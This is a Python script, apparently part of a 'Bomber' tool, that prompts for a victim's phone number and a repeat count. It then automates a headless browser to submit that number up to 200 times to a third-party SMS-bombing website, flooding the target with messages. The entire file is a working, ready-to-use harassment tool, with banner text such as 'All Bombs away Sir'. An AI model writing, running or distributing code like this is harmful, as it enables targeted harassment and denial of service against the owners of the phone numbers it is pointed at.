def smsbombing():
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import Select
    import time
    import os

    
    def remsp(num):
        num = num.replace(' ', '')
        num = num.replace('-', '')
        return num

    cc = input("    |-$ Enter Your Country Code (Without +) > ")
    ph = input('    |-$ Enter Target Number:' + " +" + cc + " ")

    ph = remsp(ph)

    if len(cc) >= 4 or len(cc) < 1:
        print('    |-$ Invalid Country Code.. Country Codes Are Generally 1-3 digits...')
        return

    if len(ph) <= 6:
        print('    |-$ Invalid Phone Number..')
        return

    for cch in str(cc + ph):
        if not cch.isdigit():
            print('    |-$ Phone Number Must Consist Of Numbers Only')
            return

    repcount = int(input('    |-$ How many times (1-200) ? > '))

    options = Options()
    options.headless = True
    options.add_argument("--log-level=3")
    browser = webdriver.Chrome("chromedriver.exe", chrome_options=options)
    os.system('cls')
    print(f'''

    All Bombs away Sir
                 \      Goodbye Dullsville!
                __|__  /
       .'(\      .-.     /)'.
    +-====(*)===: " :===(o)=====-+
            \).  '-'  .(/
                 +=
                 +=
                 +=           █▄▄ █▀█ █▀▄▀█ █▄▄ █▀▀ █▀█ ▀█▀ █ █ █▀█ █▄ █
                              █▄█ █▄█ █ ▀ █ █▄█ ██▄ █▀▄  █  █▀█ █▄█ █ ▀█
                 +=
                 +=          ###########################################
                 +=          # Version >>> v1.0 (Beta)                 #
                             # Last Update >>> 11th July 2020          #
                 +=          # Coded by b3!ngD3v (Pramurta Sinha)      #
                 +=          # Named by Ritik Gupta                    #
                 +=          # GitHub >>> https://github.com/b31ngd3v  #
                 +=          ###########################################


    |-PRESS---------------|
    | 1] Call Bomber      |
    | 2] SMS Bomber       |
    | 3] Instagram Bomber |
    | 4] WhatsApp Bomber  |
    | 5] About            |
    | 6] Exit Script      |
    |---------------------|
    |-> 2
    |-$ Victim's Phone Number (with country code) > +{cc} {ph}''')

    print(
f'''    |-$ How many times (1-200) ? > {repcount}''')
    if cc == '91':
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass

    else:
        browser.get('https://mytoolstown.com/smsbomber/change.php')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.NAME, "countrycode")))
        finally:
            pass


        select = Select(browser.find_element_by_name('countrycode'))

        try:
            select.select_by_value(cc)
        except:
            print('    |-$ invalid country code !')
            return
        finally:
            pass

        browser.find_element_by_name('submit').click()
        time.sleep(5)
        browser.get('https://mytoolstown.com/smsbomber/#bestsmsbomber')

        try:
            confirm = WebDriverWait(browser, 20).until(EC.presence_of_element_located(
                (By.ID, "mobno")))
        finally:
            pass


    browser.find_element_by_id('mobno').send_keys(int(ph))
    time.sleep(1)
    browser.find_element_by_id('count').send_keys(repcount)
    time.sleep(1)
    browser.find_element_by_id('count').send_keys(Keys.TAB + Keys.ARROW_DOWN + Keys.ARROW_DOWN + Keys.ENTER)

    while browser.current_url != 'https://mytoolstown.com/smsbomber/success.php':
        time.sleep(5)


    print(
'''    |-} Done !
    |-----------------------------------------------------------''')
    time.sleep(2)
    browser.quit()
